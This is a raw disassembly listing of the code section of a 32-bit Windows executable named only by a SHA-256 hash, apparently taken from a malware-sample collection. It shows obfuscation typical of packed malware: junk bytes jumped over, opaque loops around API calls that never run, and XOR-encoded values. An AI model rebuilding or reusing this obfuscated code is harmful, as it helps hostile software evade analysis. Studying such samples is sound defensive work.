
597f3628af042f3250b370d2b38cf4483db540c686b25e37ce010b909b6126e8.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x43365b
  40100c:	mov    eax,ds:0x413b16
  401011:	xor    DWORD PTR ds:0x4336f3,edx
  401017:	mov    eax,DWORD PTR [eax+0x198]
  40101d:	mov    ecx,DWORD PTR ds:0x4336a7
  401023:	or     DWORD PTR ds:0x433653,ecx
  401029:	mov    DWORD PTR [ebp-0x8],eax
  40102c:	mov    DWORD PTR ds:0x433643,0x436b
  401036:	jmp    0x40133c
  40103b:	mov    ah,0xd6
  40103d:	ja     0x40109f
  40103f:	jno    0x4010ae
  401041:	mov    bl,0xd2
  401043:	js     0x4010a2
  401045:	repz sbb DWORD PTR [ecx+eiz*1-0x51],esp
  40104a:	add    BYTE PTR [esp+edi*2+0x7c],bh
  40104e:	jl     0x4010b7
  401050:	jle    0x4010ce
  401052:	jl     0x401020
  401054:	xlat   BYTE PTR ds:[ebx]
  401055:	cmp    ecx,edx
  401057:	(bad)
  40105a:	ffree  st(0)
  40105c:	pop    es
  40105d:	push   es
  40105e:	add    ecx,DWORD PTR ds:0x330f023b
  401064:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401068:	adc    bl,BYTE PTR [edi]
  40106a:	inc    ebp
  40106b:	pop    edx
  40106c:	add    dh,BYTE PTR [edi-0x4610f327]
  401072:	fcmovnbe st,st(4)
  401074:	add    ecx,DWORD PTR [esp+0x4da0f6bc]
  40107b:	adc    DWORD PTR [ecx+0x641f44dc],ebp
  401081:	out    dx,al
  401082:	outs   dx,DWORD PTR ds:[esi]
  401083:	or     ebx,DWORD PTR ds:0x42d47a9e
  401089:	test   al,0x53
  40108b:	sub    ebp,ebx
  40108d:	(bad)  
  40108e:	ds test eax,0xabc17b88
  401094:	add    al,0xc6
  401096:	ror    DWORD PTR [ebp-0x3a6d2b7b],cl
  40109c:	jmp    0x4010d0
  40109e:	mov    esi,ebp
  4010a0:	dec    edi
  4010a1:	in     al,0xa4
  4010a3:	dec    ebp
  4010a4:	call   DWORD PTR [edi-0x274af866]
  4010aa:	mov    ecx,0x5134e949
  4010af:	and    esi,DWORD PTR [eax-0x41639318]
  4010b5:	jnp    0x4010d4
  4010b7:	ret    
  4010b8:	nop
  4010b9:	sub    eax,0xc05cebd6
  4010be:	out    0xba,al
  4010c0:	bnd call 0x770f4e56
  4010c6:	popa   
  4010c7:	xlat   BYTE PTR ds:[ebx]
  4010c8:	and    cl,cl
  4010ca:	add    ch,ah
  4010cc:	sbb    eax,0x331a45d
  4010d1:	outs   dx,DWORD PTR ds:[esi]
  4010d2:	ins    DWORD PTR es:[edi],dx
  4010d3:	jp     0x4010df
  4010d5:	cmp    eax,0x2a568cd9
  4010da:	jno    0x40115b
  4010dc:	cmp    al,0x8f
  4010de:	or     bl,bl
  4010e0:	mov    ah,0xb
  4010e2:	pop    ebx
  4010e3:	push   ecx
  4010e4:	(bad)  
  4010e6:	adc    eax,0x25e55ed3
  4010eb:	jge    0x401089
  4010ed:	inc    esp
  4010ee:	dec    ebx
  4010ef:	aaa    
  4010f0:	adc    DWORD PTR [ebx],ebp
  4010f2:	ja     0x401129
  4010f4:	sbb    bl,dl
  4010f6:	cmp    al,0x4f
  4010f8:	jmp    0x94ef:0x5d4da6ce
  4010ff:	and    ecx,DWORD PTR [esi-0x23]
  401102:	jge    0x401089
  401104:	adc    DWORD PTR [edx],edx
  401106:	mov    ds:0x4a3e1e23,al
  40110b:	push   ebp
  40110c:	or     esi,DWORD PTR [ecx+ecx*8+0x6d786c6]
  401113:	push   DWORD PTR [edx+0x41]
  401116:	jne    0x4010f6
  401118:	in     al,0x8b
  40111a:	push   0x75
  40111c:	sub    eax,0x7f78007f
  401121:	mov    cl,0xcc
  401123:	ins    DWORD PTR es:[edi],dx
  401124:	(bad)  
  401125:	mov    ch,0x91
  401127:	mov    ecx,0x9ba44249
  40112c:	icebp  
  40112d:	fstp   QWORD PTR [esi]
  40112f:	pop    ebp
  401130:	mov    WORD PTR [ebp+esi*2+0x36],es
  401134:	stos   DWORD PTR es:[edi],eax
  401135:	adc    BYTE PTR [edx],bh
  401137:	fild   QWORD PTR [edi]
  401139:	loop   0x4011a2
  40113b:	or     al,0x28
  40113d:	and    BYTE PTR [edi+0x5c0ba099],ah
  401143:	dec    ecx
  401144:	jmp    0x5538:0x77c57b7e
  40114b:	or     al,0x2
  40114d:	ins    DWORD PTR es:[edi],dx
  40114e:	jg     0x40119d
  401150:	or     DWORD PTR [esi-0x51597caf],0x3c63d1e5
  40115a:	dec    ecx
  40115b:	cli    
  40115c:	ins    BYTE PTR es:[edi],dx
  40115d:	xlat   BYTE PTR ds:[ebx]
  40115e:	shl    esi,0x12
  401161:	fcomp  DWORD PTR [eax]
  401163:	fmul   DWORD PTR [eax+esi*8-0x65]
  401167:	call   FWORD PTR [eax]
  401169:	fimul  DWORD PTR [ebx]
  40116b:	or     esi,esi
  40116d:	inc    ebp
  40116e:	arpl   WORD PTR [ecx+edi*1-0x52b0d8c3],bx
  401175:	in     al,dx
  401176:	inc    ebp
  401177:	inc    edi
  401178:	xor    eax,0xa4356c43
  40117d:	icebp  
  40117e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40117f:	outs   dx,DWORD PTR ds:[esi]
  401180:	int3   
  401181:	pop    ebx
  401182:	mov    ah,0x42
  401184:	xor    eax,0x33ebf496
  401189:	fwait
  40118a:	outs   dx,BYTE PTR ds:[esi]
  40118b:	outs   dx,BYTE PTR ds:[esi]
  40118c:	mov    edi,DWORD PTR [esi+ebp*1+0x12]
  401190:	xchg   BYTE PTR [edx+0x27e67dcd],ch
  401196:	or     dl,BYTE PTR [esi-0x17]
  401199:	in     al,0x36
  40119b:	push   ds
  40119c:	jne    0x401190
  40119e:	icebp  
  40119f:	sahf   
  4011a0:	jmp    0xeb92:0xbc50dc46
  4011a7:	imul   ebx,DWORD PTR [eax],0xffffffcc
  4011aa:	outs   dx,BYTE PTR ds:[esi]
  4011ab:	pop    esp
  4011ac:	xchg   DWORD PTR [esi-0x40d23b87],ebx
  4011b2:	pop    eax
  4011b3:	mov    edi,0x4dbb94f4
  4011b8:	dec    esp
  4011b9:	cld    
  4011ba:	scas   al,BYTE PTR es:[edi]
  4011bb:	jmp    0x40118c
  4011bd:	xchg   BYTE PTR [ebx+ebp*8],bl
  4011c0:	mov    cl,0x9d
  4011c2:	sahf   
  4011c3:	pop    esp
  4011c4:	mul    DWORD PTR [eax]
  4011c6:	(bad)  
  4011c7:	cmp    DWORD PTR [edx],esp
  4011c9:	int    0x1f
  4011cb:	jmp    eax
  4011cd:	mov    bl,0xf7
  4011cf:	push   edi
  4011d0:	dec    esi
  4011d1:	hlt    
  4011d2:	xor    edi,DWORD PTR [ebp-0x1]
  4011d5:	ror    BYTE PTR [ebp+0x75ecd5d6],1
  4011db:	dec    esp
  4011dc:	stc    
  4011dd:	mov    DWORD PTR [eax*1+0x404e9bd],0x61e4e66a
  4011e8:	mov    edx,0x3a2fd1af
  4011ed:	add    BYTE PTR [ebx+0x62],ch
  4011f0:	(bad)  
  4011f1:	in     eax,dx
  4011f2:	push   0x44ac210c
  4011f7:	mov    bl,bl
  4011f9:	hlt    
  4011fa:	jmp    0x40126f
  4011fc:	adc    edi,DWORD PTR [esi-0x76]
  4011ff:	add    eax,0x5076694d
  401204:	outs   dx,DWORD PTR ds:[esi]
  401205:	adc    eax,0x98ab2ee6
  40120a:	xchg   edi,eax
  40120b:	push   ds
  40120c:	jl     0x401289
  40120e:	and    eax,0x3ce4c214
  401213:	in     eax,0x1f
  401215:	jge    0x401280
  401217:	fcomp  QWORD PTR [edi+eax*4]
  40121a:	out    0x8a,al
  40121c:	mov    eax,ds:0xe668bb75
  401221:	push   eax
  401222:	bound  ebx,QWORD PTR [esi]
  401224:	cmp    ebx,DWORD PTR [edx+0x2b]
  401227:	add    BYTE PTR [edx-0x1e6d1a06],al
  40122d:	mov    dl,0xc6
  40122f:	mov    ?,WORD PTR [edx+0x393ea2fe]
  401235:	xchg   esi,eax
  401236:	je     0x401271
  401238:	jle    0x4012b0
  40123a:	pop    esi
  40123b:	add    al,0xfe
  40123d:	mov    cl,0x41
  40123f:	clc    
  401240:	sbb    al,0xb0
  401242:	or     BYTE PTR [ebx],dl
  401244:	push   eax
  401245:	adc    dl,BYTE PTR ss:[ebp+0x24586f83]
  40124c:	and    eax,0x8f4f09d7
  401251:	loope  0x4011d3
  401253:	inc    ecx
  401254:	jbe    0x40121e
  401256:	les    edx,FWORD PTR [eax-0x2437ca27]
  40125c:	inc    esp
  40125d:	xchg   esi,eax
  40125e:	out    dx,eax
  40125f:	xchg   esp,eax
  401260:	call   0x34fbacce
  401265:	out    dx,eax
  401266:	imul   esp,DWORD PTR gs:[ecx+edx*1],0xd2ee4cf3
  40126e:	sub    BYTE PTR [edx-0x3fa5cdc6],ch
  401274:	test   ecx,0x80dd4a8c
  40127a:	in     al,dx
  40127b:	std    
  40127c:	dec    esi
  40127d:	test   al,0xfe
  40127f:	aas    
  401280:	xor    DWORD PTR [eax+0x53113c68],esi
  401286:	sub    BYTE PTR [ebx-0x737ecdc2],cl
  40128c:	push   ebp
  40128d:	and    DWORD PTR [eax+0x4a],0x913d0741
  401294:	sub    eax,0x508abd9
  401299:	fistp  WORD PTR [edi+0x1d]
  40129c:	add    DWORD PTR [ebx-0x2548de28],ecx
  4012a2:	dec    ebp
  4012a3:	loope  0x401252
  4012a5:	dec    eax
  4012a6:	in     eax,0x6b
  4012a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012a9:	push   ebx
  4012aa:	test   eax,0x6b51dda1
  4012af:	pop    ebp
  4012b0:	mov    ebp,0x1099da5f
  4012b5:	pop    ecx
  4012b6:	loop   0x40130f
  4012b8:	test   BYTE PTR [ebx-0x1],bl
  4012bb:	loope  0x401288
  4012bd:	cmp    BYTE PTR ds:[esi-0x1a],al
  4012c1:	in     al,0x95
  4012c3:	adc    BYTE PTR [eax+eax*8],cl
  4012c6:	lea    edx,[eax-0x57]
  4012c9:	mov    dl,bh
  4012cb:	dec    ecx
  4012cc:	sahf   
  4012cd:	sbb    al,bh
  4012cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012d0:	or     eax,ebp
  4012d2:	(bad)  [edi]
  4012d4:	add    DWORD PTR [esp+edx*2+0x48],edx
  4012d8:	cmp    DWORD PTR [edx-0xe],edi
  4012db:	jns    0x4012e3
  4012dd:	push   0xffffffe6
  4012df:	mov    al,ds:0x8925604c
  4012e4:	out    0xea,al
  4012e6:	mov    ch,0x76
  4012e8:	inc    esi
  4012e9:	jb     0x40128b
  4012eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012ed:	and    eax,0x1a3f5f7
  4012f2:	mov    ch,0xa5
  4012f4:	iret   
  4012f5:	and    esi,DWORD PTR [ebp-0x5e2dc899]
  4012fb:	aam    0xdf
  4012fd:	repz mov ebx,0xf99b1b8a
  401303:	pop    es
  401304:	or     al,0x9f
  401306:	pop    ss
  401307:	sbb    eax,0xef2e21ac
  40130c:	mov    WORD PTR [eax+0x5a6d81],cs
  401312:	sub    edi,0x63f1eddd
  401318:	ss dec ebp
  40131a:	cld    
  40131b:	jecxz  0x4012ea
  40131d:	fmulp  st(7),st
  40131f:	pop    ds
  401320:	adc    esp,DWORD PTR [edx-0x40]
  401323:	pop    esp
  401324:	aaa    
  401325:	pop    eax
  401326:	repz push cs
  401328:	and    DWORD PTR [edi-0x51070d55],0xffffffdc
  40132f:	(bad)  
  401331:	(bad)  
  401333:	or     al,0x31
  401335:	xor    esi,DWORD PTR [ebp+0x49b909cb]
  40133b:	xchg   ebx,eax
  40133c:	mov    eax,DWORD PTR [ebp+0x8]
  40133f:	mov    ecx,DWORD PTR [ebp-0x8]
  401342:	push   ebx
  401343:	or     DWORD PTR ds:0x4336a7,edx
  401349:	push   esi
  40134a:	add    esi,DWORD PTR ds:0x43369b
  401350:	mov    esi,0x7510853
  401355:	and    ebx,0x1c58
  40135b:	xor    eax,esi
  40135d:	and    DWORD PTR ds:0x43371f,0x0
  401367:	jmp    0x401379
  40136c:	mov    ebx,DWORD PTR ds:0x43371f
  401372:	inc    ebx
  401373:	mov    DWORD PTR ds:0x43371f,ebx
  401379:	cmp    DWORD PTR ds:0x43371f,0x11
  401380:	jae    0x4013b5
  401386:	cmp    DWORD PTR ds:0x43371f,0x16
  40138d:	jne    0x4013b0
  401393:	push   0x12df
  401398:	push   DWORD PTR [ebp-0x18]
  40139b:	push   0x49a7
  4013a0:	push   0x1ff7
  4013a5:	push   0x54a2
  4013aa:	call   DWORD PTR ds:0x41224c
  4013b0:	jmp    0x40136c
  4013b5:	push   edi
  4013b6:	or     edi,edi
  4013b8:	mov    edi,0x32729a
  4013bd:	not    ebx
  4013bf:	add    eax,edi
  4013c1:	adc    ebx,0x3cf3
  4013c7:	mov    DWORD PTR [ecx],eax
  4013c9:	sbb    DWORD PTR ds:0x433663,0x6b1e
  4013d3:	lea    eax,[ebp-0x4]
  4013d6:	mov    DWORD PTR [ebp-0x10],eax
  4013d9:	mov    eax,DWORD PTR [ebp+0x8]
  4013dc:	xor    DWORD PTR ds:0x43369f,0x46ad
  4013e6:	mov    ecx,DWORD PTR [ebp-0x10]
  4013e9:	xor    eax,esi
  4013eb:	add    eax,edi
  4013ed:	mov    DWORD PTR ds:0x433697,0x19
  4013f7:	cmp    DWORD PTR ds:0x433697,0x0
  4013fe:	je     0x40144d
  401404:	cmp    DWORD PTR ds:0x433697,0xb
  40140b:	jne    0x401421
  401411:	push   0x433653
  401416:	push   0x62b0
  40141b:	call   DWORD PTR ds:0x41217c
  401421:	cmp    DWORD PTR ds:0x433697,0xc
  401428:	jne    0x40143b
  40142e:	mov    ebx,DWORD PTR ds:0x433697
  401434:	dec    ebx
  401435:	mov    DWORD PTR ds:0x433697,ebx
  40143b:	mov    ebx,DWORD PTR ds:0x433697
  401441:	dec    ebx
  401442:	mov    DWORD PTR ds:0x433697,ebx
  401448:	jmp    0x4013f7
  40144d:	mov    DWORD PTR [ecx],eax
  40144f:	or     DWORD PTR ds:0x43364f,0x433643
  401459:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  401460:	xor    DWORD PTR ds:0x433653,ebx
  401466:	lea    eax,[ebp-0x14]
  401469:	neg    ecx
  40146b:	mov    DWORD PTR [ebp-0x20],eax
  40146e:	mov    eax,DWORD PTR [ebp-0x14]
  401471:	mov    ecx,DWORD PTR [ebp-0x20]
  401474:	xor    eax,esi
  401476:	neg    ebx
  401478:	add    eax,edi
  40147a:	mov    DWORD PTR [ecx],eax
  40147c:	and    DWORD PTR ds:0x43371b,0x0
  401486:	xor    eax,eax
  401488:	add    eax,DWORD PTR ds:0x43371b
  40148e:	inc    eax
  40148f:	mov    ds:0x43371b,eax
  401494:	cmp    DWORD PTR ds:0x43371b,0x9
  40149b:	jne    0x4014ac
  4014a1:	push   0x8c0a
  4014a6:	call   DWORD PTR ds:0x412250
  4014ac:	cmp    DWORD PTR ds:0x43371b,0x8
  4014b3:	jne    0x4014c4
  4014b9:	mov    eax,ds:0x43371b
  4014be:	inc    eax
  4014bf:	mov    ds:0x43371b,eax
  4014c4:	cmp    DWORD PTR ds:0x43371b,0x1c
  4014cb:	jb     0x401486
  4014d1:	mov    eax,ds:0x413bea
  4014d6:	mov    ebx,0x8e12febe
  4014db:	sbb    DWORD PTR ds:0x4336df,0x47a9
  4014e5:	mov    DWORD PTR [ebp-0xc],ebx
  4014e8:	dec    DWORD PTR ds:0x43365b
  4014ee:	mov    eax,DWORD PTR [eax]
  4014f0:	mov    cx,WORD PTR [ebp-0x4]
  4014f4:	movzx  ecx,cx
  4014f7:	sbb    DWORD PTR ds:0x43364f,0x43369f
  401501:	jmp    0x401807
  401506:	mov    dh,0x9a
  401508:	adc    cl,al
  40150a:	adc    BYTE PTR [ecx+0x7d],dh
  40150d:	jne    0x4014ba
  40150f:	arpl   ax,bx
  401511:	ins    DWORD PTR es:[edi],dx
  401512:	lea    ebp,[esp+ebx*4-0x33]
  401516:	addr16 jle 0x401595
  401519:	jl     0x401582
  40151b:	jle    0x401599
  40151d:	jl     0x40158f
  40151f:	xchg   edi,eax
  401520:	call   0x536d:0xd3197c81
  401527:	lea    ecx,[eax-0x3ab4af4f]
  40152d:	jmp    0xa0e1b8d4
  401532:	out    0x67,eax
  401534:	xor    eax,0xdb93e354
  401539:	xchg   BYTE PTR [edi],cl
  40153b:	and    cl,al
  40153d:	sbb    esp,DWORD PTR [esi+ebx*1]
  401540:	add    dh,BYTE PTR [esi]
  401542:	fdivr  QWORD PTR [edi-0x730063c4]
  401548:	push   0x42
  40154a:	adc    al,0x8b
  40154c:	adc    bl,BYTE PTR [edi-0x46]
  40154f:	inc    edi
  401550:	inc    esp
  401551:	cmp    ecx,ebp
  401553:	popa   
  401554:	lock or bl,bh
  401557:	pushf  
  401558:	inc    edx
  401559:	dec    ebp
  40155a:	(bad)  
  40155b:	push   0xcfec590
  401560:	outs   dx,DWORD PTR ds:[esi]
  401561:	mov    eax,ds:0x401ff80
  401566:	out    0xec,eax
  401568:	ss jg  0x4014fa
  40156b:	push   ss
  40156c:	or     dh,BYTE PTR [ecx]
  40156e:	std    
  40156f:	add    DWORD PTR [edi],esi
  401571:	xor    eax,0x13483338
  401576:	imul   ebp,edi,0x4c7c4fad
  40157c:	sbb    eax,0xbf63a1d9
  401581:	or     bh,BYTE PTR [ecx]
  401583:	sbb    ebp,eax
  401585:	mov    ah,0xd
  401587:	xchg   cl,ch
  401589:	mov    al,ds:0x5e6a3c3c
  40158e:	fcomp  QWORD PTR [bx]
  401591:	aam    0x52
  401593:	cld    
  401594:	stos   DWORD PTR es:[edi],eax
  401595:	jmp    0x4a3b:0x7570c71e
  40159c:	cmp    ebx,0xfffffffc
  40159f:	jecxz  0x40160a
  4015a1:	or     al,0x14
  4015a3:	pop    ss
  4015a4:	stos   BYTE PTR es:[edi],al
  4015a5:	or     ebx,esp
  4015a7:	(bad)  
  4015a8:	(bad)  
  4015aa:	jns    0x4015b5
  4015ac:	in     eax,dx
  4015ad:	retf   
  4015ae:	imul   edx,DWORD PTR [esi+0x682a178f],0xfffffff2
  4015b5:	in     al,0x6
  4015b7:	(bad)  
  4015b9:	mov    ebp,0xa5caf70b
  4015be:	mov    ebx,0x1b54b0de
  4015c3:	sub    eax,0xc42f70fa
  4015c8:	stos   BYTE PTR es:[edi],al
  4015c9:	loop   0x401638
  4015cb:	(bad)  
  4015cc:	out    dx,eax
  4015cd:	cld    
  4015ce:	fwait
  4015cf:	or     ebx,ebx
  4015d1:	ja     0x401641
  4015d3:	mov    WORD PTR [eax],ss
  4015d5:	mov    fs,WORD PTR [esi+0x5776b442]
  4015db:	cdq    
  4015dc:	icebp  
  4015dd:	jl     0x40158a
  4015df:	sti    
  4015e0:	shl    DWORD PTR [ebx-0x56],1
  4015e3:	fidiv  WORD PTR [eax]
  4015e5:	(bad)  
  4015e6:	and    al,0xc2
  4015e8:	icebp  
  4015e9:	into   
  4015ea:	dec    eax
  4015eb:	aam    0xff
  4015ed:	shl    BYTE PTR [edx-0x49],1
  4015f0:	sbb    al,0x3f
  4015f2:	mov    DWORD PTR [edx+0x3f],ebx
  4015f5:	outs   dx,DWORD PTR ds:[esi]
  4015f6:	push   0x18f82e1
  4015fb:	pop    es
  4015fc:	sti    
  4015fd:	test   eax,0xc0ae68a9
  401602:	shr    edx,0x32
  401605:	(bad)  
  401606:	jne    0x401604
  401608:	mov    eax,0x4aa5cb37
  40160d:	mov    edi,0x523f5715
  401612:	dec    eax
  401613:	adc    al,0x9b
  401615:	xchg   esi,ebx
  401617:	icebp  
  401618:	iret   
  401619:	sbb    dh,BYTE PTR [esi+0x695a0aa4]
  40161f:	inc    ebx
  401620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401621:	dec    eax
  401622:	sar    bl,cl
  401624:	js     0x40168a
  401626:	add    BYTE PTR gs:[edx],dh
  401629:	mov    ds:0xb5c451a6,eax
  40162e:	mov    bh,0x18
  401630:	or     eax,0x5cd22a2f
  401635:	mov    dh,0xc2
  401637:	jno    0x4016af
  401639:	cmp    BYTE PTR [bp+0x7a],0xd
  40163e:	add    eax,0x719995ab
  401643:	(bad)  
  401644:	sbb    esi,DWORD PTR [eax]
  401646:	stc    
  401647:	push   edx
  401648:	retf   
  401649:	push   es
  40164a:	retf   0xeca8
  40164d:	mov    ds:0xc19becc0,eax
  401652:	cwde   
  401653:	mov    edi,ebp
  401655:	out    dx,al
  401656:	(bad)  
  401657:	push   esp
  401658:	inc    esp
  401659:	mov    al,0x44
  40165b:	sbb    dh,al
  40165d:	pop    es
  40165e:	push   esi
  40165f:	xchg   esp,eax
  401661:	sub    eax,0xa76eeaa6
  401666:	cmc    
  401667:	js     0x40161f
  401669:	sbb    esi,ecx
  40166b:	mov    al,0x40
  40166d:	mov    ebx,0xa6a044e3
  401672:	dec    eax
  401673:	jae    0x401681
  401675:	adc    esp,DWORD PTR [edi-0x17536d14]
  40167b:	sar    DWORD PTR [eax],0x19
  40167e:	int3   
  40167f:	imul   esp,DWORD PTR [ebx],0x7ccc1fc
  401685:	or     DWORD PTR [esi-0x737aba72],esp
  40168b:	adc    ebp,DWORD PTR [esi]
  40168d:	mov    ebp,0x77f019b9
  401692:	test   al,0x78
  401694:	adc    al,0xa8
  401696:	mov    esp,0xcbad60a9
  40169b:	inc    edx
  40169c:	jae    0x4016e5
  40169e:	fldenv [ecx-0x7b1d8416]
  4016a4:	ja     0x4016c5
  4016a6:	xor    BYTE PTR [ebp+0x5fae885f],ch
  4016ac:	cmp    cl,BYTE PTR [esi]
  4016ae:	(bad)  
  4016af:	jmp    0x40170b
  4016b1:	fsub   QWORD PTR [esi]
  4016b3:	adc    eax,0x2c3a6705
  4016b8:	and    BYTE PTR [edx*1-0x2fa193c],cl
  4016bf:	fbstp  TBYTE PTR [ecx+0x12]
  4016c2:	pop    es
  4016c3:	xlat   BYTE PTR ds:[ebx]
  4016c4:	(bad)  
  4016c5:	sub    ah,BYTE PTR [ecx+0xf519d19]
  4016cb:	mov    eax,ds:0x186167f4
  4016d0:	rcr    DWORD PTR [edx+edx*1],1
  4016d3:	imul   ebp,DWORD PTR [edx],0x50
  4016d6:	fnstcw WORD PTR [edi-0x44df33f2]
  4016dc:	dec    esi
  4016dd:	xchg   ecx,esi
  4016df:	iret   
  4016e0:	aaa    
  4016e1:	push   edx
  4016e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016e3:	xor    al,0xfe
  4016e5:	ret    0x9ea3
  4016e8:	loope  0x4016ba
  4016ea:	ffreep st(1)
  4016ec:	push   eax
  4016ed:	push   DWORD PTR [esi]
  4016ef:	push   cs
  4016f0:	fcomp  DWORD PTR [si-0x2fac]
  4016f5:	out    0x9a,eax
  4016f7:	mov    ebx,0x43fa78c8
  4016fc:	hlt    
  4016fd:	and    DWORD PTR [eax-0x6e7687f5],esp
  401703:	cmc    
  401704:	push   esp
  401705:	pop    ebp
  401706:	jae    0x40176b
  401708:	aad    0xc0
  40170a:	lahf   
  40170b:	inc    ebx
  40170c:	pop    ebp
  40170d:	mul    BYTE PTR [edi]
  40170f:	shl    BYTE PTR [esi-0x65d9b42a],1
  401715:	add    eax,0x11a209bd
  40171a:	inc    esp
  40171b:	fs in  al,0x62
  40171e:	mov    BYTE PTR [eax],ah
  401720:	push   edi
  401721:	add    cl,BYTE PTR [esp+esi*2-0x18]
  401725:	jge    0x401707
  401727:	mov    ecx,0xaa883ba6
  40172c:	or     eax,0xbf7cf5a6
  401731:	dec    esi
  401732:	ja     0x40173c
  401734:	mov    ds:0xf9e41079,eax
  401739:	xchg   esi,eax
  40173a:	je     0x40171a
  40173c:	popf   
  40173d:	or     BYTE PTR [ebx],bl
  40173f:	jmp    0x5786:0xc15274e2
  401746:	mov    WORD PTR [edi],cs
  401748:	push   eax
  401749:	lock pusha 
  40174b:	jg     0x401738
  40174d:	adc    bl,BYTE PTR [edi+0x25]
  401750:	fs sbb eax,0xd740a27b
  401756:	outs   dx,BYTE PTR ds:[esi]
  401757:	test   DWORD PTR [edx],eax
  401759:	sub    dl,dh
  40175b:	add    ch,ah
  40175d:	(bad)  
  40175e:	shl    BYTE PTR [ebp-0x24],cl
  401761:	in     al,0x82
  401763:	xlat   BYTE PTR ds:[ebx]
  401764:	cmp    BYTE PTR [eax+0x10],al
  401767:	pop    ebx
  401768:	sbb    ebx,edx
  40176a:	lds    edx,FWORD PTR [edi-0x33]
  40176d:	jns    0x40177c
  40176f:	xor    DWORD PTR [eax+0x1b],ebp
  401772:	sub    bh,al
  401774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401775:	mov    ds:0x65fe28be,al
  40177a:	mov    edx,0xec82d2fc
  40177f:	xor    al,ah
  401781:	fcos   
  401783:	jne    0x4017de
  401785:	add    bh,ah
  401787:	sbb    BYTE PTR [bp+si-0x43],0x8e
  40178c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40178d:	adc    esp,DWORD PTR ds:0x13c5069
  401793:	mov    eax,ds:0x8d06fa41
  401798:	mov    ch,ch
  40179a:	jge    0x401780
  40179c:	jmp    0x401768
  40179e:	lds    ebx,FWORD PTR [ebp-0x6a0d8702]
  4017a4:	dec    ecx
  4017a5:	push   0xffffffb3
  4017a7:	push   ebp
  4017a8:	adc    al,0x33
  4017aa:	jmp    0xefaec1c0
  4017af:	fld    TBYTE PTR [edi-0x41]
  4017b2:	lods   eax,DWORD PTR ds:[esi]
  4017b3:	xchg   ecx,eax
  4017b4:	jg     0x401803
  4017b6:	add    BYTE PTR [ebp+0x2e],bh
  4017b9:	imul   ebx,DWORD PTR [eax-0x55e5043],0x6b
  4017c0:	mov    WORD PTR [eax-0x2c],fs
  4017c3:	sub    al,0x14
  4017c5:	cmp    eax,0xf7d82e66
  4017ca:	mov    ch,0xb7
  4017cc:	in     eax,0x86
  4017ce:	lea    esp,[edx]
  4017d0:	xchg   ebp,eax
  4017d1:	aaa    
  4017d2:	jge    0x401787
  4017d4:	xchg   edi,eax
  4017d5:	pop    esp
  4017d6:	xor    ecx,DWORD PTR [ecx-0x34bd7212]
  4017dc:	cs jne 0x4017e9
  4017df:	sub    ecx,eax
  4017e1:	sbb    DWORD PTR [edx],esp
  4017e3:	jno    0x4017ad
  4017e5:	push   ecx
  4017e6:	fiadd  DWORD PTR [edx+0x3a483e70]
  4017ec:	ins    DWORD PTR es:[edi],dx
  4017ed:	dec    edi
  4017ee:	dec    ecx
  4017ef:	jbe    0x401868
  4017f1:	push   esp
  4017f2:	mov    ebx,0x8e9b0b9
  4017f7:	pop    ss
  4017f8:	sbb    eax,DWORD PTR [ebx-0x2660a6f5]
  4017fe:	ss loopne 0x401855
  401801:	jecxz  0x4017ea
  401803:	lock ffreep st(0)
  401806:	mov    ebp,0x57a10803
  40180b:	aaa    
  40180c:	inc    ebx
  40180d:	add    BYTE PTR [ecx],al
  40180f:	add    eax,0x43364b
  401814:	mov    DWORD PTR [ebp-0x18],ecx
  401817:	mov    eax,DWORD PTR [ebp+0x8]
  40181a:	xor    DWORD PTR ds:0x43369b,0x1391
  401824:	mov    ecx,DWORD PTR [ebp-0x8]
  401827:	xor    eax,esi
  401829:	add    eax,edi
  40182b:	cmp    DWORD PTR [ecx],eax
  40182d:	mov    DWORD PTR ds:0x43369b,0x716
  401837:	jne    0x402597
  40183d:	mov    eax,DWORD PTR [ebp+0x8]
  401840:	add    DWORD PTR ds:0x433663,edi
  401846:	mov    ecx,DWORD PTR [ebp-0x18]
  401849:	or     DWORD PTR ds:0x43372f,0x433717
  401853:	xor    eax,esi
  401855:	add    eax,edi
  401857:	cmp    DWORD PTR [ecx],eax
  401859:	jne    0x401f33
  40185f:	sbb    ecx,DWORD PTR ds:0x4336ab
  401865:	mov    eax,DWORD PTR [ebp+0x8]
  401868:	mov    DWORD PTR ds:0x4336e7,0x18
  401872:	cmp    DWORD PTR ds:0x4336e7,0x0
  401879:	je     0x4018bc
  40187f:	cmp    DWORD PTR ds:0x4336e7,0x28
  401886:	jne    0x4018a2
  40188c:	push   DWORD PTR [ebp-0x24]
  40188f:	push   DWORD PTR [ebp-0xc]
  401892:	push   0x6fcb
  401897:	push   0x70d4
  40189c:	call   DWORD PTR ds:0x4120b4
  4018a2:	xor    edx,edx
  4018a4:	add    edx,DWORD PTR ds:0x4336e7
  4018aa:	dec    edx
  4018ab:	mov    DWORD PTR ds:0x4336e7,edx
  4018b1:	jmp    0x401872
  4018b6:	adc    edx,0x63fa
  4018bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4018bf:	and    DWORD PTR ds:0x433717,0x0
  4018c9:	jmp    0x4018db
  4018ce:	mov    edx,DWORD PTR ds:0x433717
  4018d4:	inc    edx
  4018d5:	mov    DWORD PTR ds:0x433717,edx
  4018db:	cmp    DWORD PTR ds:0x433717,0x15
  4018e2:	jae    0x401910
  4018e8:	cmp    DWORD PTR ds:0x433717,0x17
  4018ef:	jne    0x40190b
  4018f5:	push   0x43376f
  4018fa:	push   DWORD PTR [ebp-0x10]
  4018fd:	push   0x6a0b
  401902:	push   DWORD PTR [ebp-0xc]
  401905:	call   DWORD PTR ds:0x4120b8
  40190b:	jmp    0x4018ce
  401910:	xor    eax,esi
  401912:	add    eax,edi
  401914:	mov    DWORD PTR [ecx],eax
  401916:	mov    eax,DWORD PTR [ebp-0x10]
  401919:	mov    ecx,DWORD PTR [ebp+0x10]
